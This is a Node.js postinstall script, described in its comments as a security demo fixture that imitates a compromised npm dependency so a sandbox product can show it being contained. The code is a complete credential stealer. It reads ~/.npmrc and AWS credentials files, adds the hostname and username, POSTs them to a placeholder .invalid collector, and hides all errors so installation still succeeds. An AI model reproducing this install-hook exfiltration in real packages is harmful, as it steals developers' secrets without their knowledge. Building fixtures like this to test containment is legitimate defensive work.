'use strict';

// SECURITY DEMO FIXTURE.
// This script intentionally simulates a compromised dependency's postinstall
// behavior so the sandbox product can demonstrate containing it. It only ever
// runs inside an isolated test VM that holds fake canary credentials and blocks
// outbound network access. The destination is a reserved, non-resolving
// .invalid domain, so no real data can ever leave the machine.

const fs = require('fs');
const os = require('os');
const path = require('path');
const https = require('https');

const DESTINATION = 'https://collector.airlock-demo.invalid/upload';
const TIMEOUT_MS = 5000;

const TARGET_FILES = [path.join(os.homedir(), '.npmrc'), path.join(os.homedir(), '.aws', 'credentials')];

function readIfExists(filePath) {
  try {
    return fs.readFileSync(filePath, 'utf8');
  } catch (err) {
    return null;
  }
}

function collect() {
  const files = {};
  for (const filePath of TARGET_FILES) {
    const contents = readIfExists(filePath);
    if (contents !== null) {
      files[filePath] = contents;
    }
  }
  return files;
}

function send(payload) {
  return new Promise((resolve) => {
    let settled = false;
    const finish = () => {
      if (settled) return;
      settled = true;
      resolve();
    };

    try {
      const body = Buffer.from(JSON.stringify(payload), 'utf8');
      const url = new URL(DESTINATION);
      const req = https.request(
        {
          protocol: url.protocol,
          hostname: url.hostname,
          port: url.port || 443,
          path: url.pathname + url.search,
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Content-Length': body.length
          },
          timeout: TIMEOUT_MS
        },
        (res) => {
          res.on('data', () => {});
          res.on('end', finish);
          res.on('error', finish);
        }
      );
      req.on('timeout', () => {
        req.destroy();
        finish();
      });
      req.on('error', finish);
      req.write(body);
      req.end();
    } catch (err) {
      finish();
    }

    setTimeout(finish, TIMEOUT_MS).unref();
  });
}

async function main() {
  try {
    const payload = {
      package: 'left-padder',
      version: '1.4.3',
      host: os.hostname(),
      user: os.userInfo().username,
      files: collect()
    };
    await send(payload);
  } catch (err) {
    // Swallow everything: npm install must always succeed.
  }
  process.exit(0);
}

main().then(
  () => {},
  () => {
    process.exit(0);
  }
);
